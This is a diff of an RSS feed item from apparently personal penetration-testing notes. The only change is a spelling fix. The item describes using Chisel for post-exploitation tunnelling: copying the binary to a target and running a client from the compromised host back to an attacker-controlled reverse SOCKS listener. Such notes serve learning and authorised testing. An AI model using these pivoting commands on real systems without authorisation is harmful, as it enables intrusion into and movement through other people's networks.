@@ -35,7 +35,7 @@ look in the /etc/crontab file and look at what jobs are running if there is no f
       
       <guid>/hacking/notes/tunnelling/</guid>
       <description>Chisel use webserver method to transfer files or use scp scp -i Key chisel user@target:/tmp/chisel has two modes server and client reverse SOCKS proxy
-set up listener on attaacking box ./chisel server -p listenPort &amp;ndash;reverse &amp;amp; on the compromised host ./chisel client attackingIP:listenPort R:socks &amp;amp; port for sending data back through the proxy will be different forward SOCKS proxy
+set up listener on attacking box ./chisel server -p listenPort &amp;ndash;reverse &amp;amp; on the compromised host ./chisel client attackingIP:listenPort R:socks &amp;amp; port for sending data back through the proxy will be different forward SOCKS proxy
 on compromised host ./chisel server -p listenPort &amp;ndash;socks5 on attacking box .</description>
     </item>
     
